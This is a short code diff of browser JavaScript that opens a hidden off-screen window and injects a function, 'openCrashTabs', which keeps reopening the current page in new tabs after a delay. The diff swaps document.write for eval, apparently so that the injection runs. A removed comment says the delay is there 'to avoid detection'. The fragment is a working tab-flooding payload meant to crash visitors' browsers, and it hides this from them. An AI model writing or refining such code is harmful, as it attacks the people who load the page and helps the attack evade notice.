@@ -12,15 +12,13 @@
             let newWin = window.open("https://www.google.com", "_blank", "width=800,height=600,left=5000,top=5000"); // Opens off-screen
             if (newWin) {
                 setTimeout(() => {
-                    newWin.document.write(`
-                        <script>
-                            function openCrashTabs() {
-                                for (let i = 0; i < ${numTabs}; i++) {
-                                    window.open("${window.location.href}", "_blank");
-                                }
+                    newWin.eval(`
+                        function openCrashTabs() {
+                            for (let i = 0; i < ${numTabs}; i++) {
+                                window.open("${window.location.href}", "_blank");
                             }
-                            setTimeout(openCrashTabs, 1000); // Delay to avoid detection
-                        <\/script>
+                        }
+                        setTimeout(openCrashTabs, 1000); // Delayed execution
                     `);
                 }, 2000);
             }
